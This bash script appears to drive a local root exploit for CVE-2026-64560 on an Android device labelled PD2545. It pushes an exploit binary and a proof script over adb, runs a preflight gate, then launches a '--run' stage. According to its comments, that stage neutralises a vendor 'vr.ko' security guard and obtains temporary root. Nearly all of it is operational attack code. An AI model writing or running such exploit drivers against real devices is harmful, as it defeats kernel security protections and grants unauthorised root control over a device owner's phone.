#!/usr/bin/env bash
# PD2545D CVE-2026-64560 direct temporary-root attempt.
#
# 1) read-only preflight gate (identity / limits / slab / uhid)
# 2) --run with FG_ROOT_EXEC pointing at a root proof script
#
# The vr.ko neutralization is built into the payload (PreSpawn sys_exit
# tracepoint funcs=0, PostSpawn task tag clear). No boot.img is required for
# the attempt. A wrong private-respin symbol/PHYS_DELTA can still panic or
# reboot the device; the exploit does not write partitions and the device
# recovers by rebooting.
#
# Usage: ./tools/pd2545_run.sh [adb-serial]
#        ADB=/path/to/adb ./tools/pd2545_run.sh
set -uo pipefail

# Git Bash/MSYS rewrites /data/... into C:/Program Files/Git/...; disable.
export MSYS2_ARG_CONV_EXCL='/data'

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ADB="${ADB:-D:/D-code/tools/android/platform-tools/adb.exe}"
SERIAL="${1:-}"
BIN="$HERE/pd2545-64560/build/cve-2026-64560-pd2545"
REMOTE="/data/local/tmp/cve-2026-64560-pd2545"
ROOTSH="/data/local/tmp/pd2545_root.sh"
LOG_DIR="$HERE/logs"
LOG="$LOG_DIR/pd2545-run-$(date +%Y%m%d-%H%M%S).log"

[ -f "$BIN" ] || { echo "missing $BIN (run pd2545-64560/build.sh)" >&2; exit 2; }
[ -x "$ADB" ] || ADB="$ADB.exe"
[ -x "$ADB" ] || { echo "missing adb: $ADB" >&2; exit 2; }
mkdir -p "$LOG_DIR"

adb_() {
    if [ -n "$SERIAL" ]; then "$ADB" -s "$SERIAL" "$@"; else "$ADB" "$@"; fi
}
sh_() { adb_ shell "$@" 2>&1; }

{
    echo "=== PD2545 direct root attempt $(date -Is) ==="
    "$ADB" devices -l
    adb_ wait-for-device
    echo "--- push ---"
    adb_ push "$BIN" "$REMOTE"
    ROOTSH_LOCAL="$(mktemp)"
    cat > "$ROOTSH_LOCAL" <<'ROOTEOF'
#!/system/bin/sh
echo __PD2545_ROOT_PROOF__
id
cat /proc/self/attr/current 2>/dev/null
grep -E '^(Uid|Gid|CapEff):' /proc/self/status
cat /proc/version
echo __PD2545_ROOT_END__
ROOTEOF
    adb_ push "$ROOTSH_LOCAL" "$ROOTSH"
    rm -f "$ROOTSH_LOCAL"
    sh_ "chmod 755 $REMOTE $ROOTSH"

    echo "--- read-only preflight gate ---"
    sh_ "$REMOTE --preflight"
    if ! sh_ "$REMOTE --preflight" | grep -q 'TARGET_PROFILE_GATE_PASS profile=pd2545-dd6fd5c98918'; then
        echo "PREFLIGHT_GATE_FAIL: not starting --run"
        exit 3
    fi

    echo "--- full run (temporary root attempt) ---"
    echo "device may panic/reboot; no partitions are written"
    sh_ "FG_ROOT_EXEC=$ROOTSH $REMOTE --run"

    echo "--- post-run ---"
    adb_ wait-for-device
    sh_ 'getprop ro.build.version.incremental; uname -r'
    echo "=== done; inspect VR_GUARD_*, STAGE8_PERMISSIVE_PASS, ROOT_CHILD_HOLD_PASS, __PD2545_ROOT_PROOF__ ==="
} 2>&1 | tee "$LOG"

echo
echo "log: $LOG"
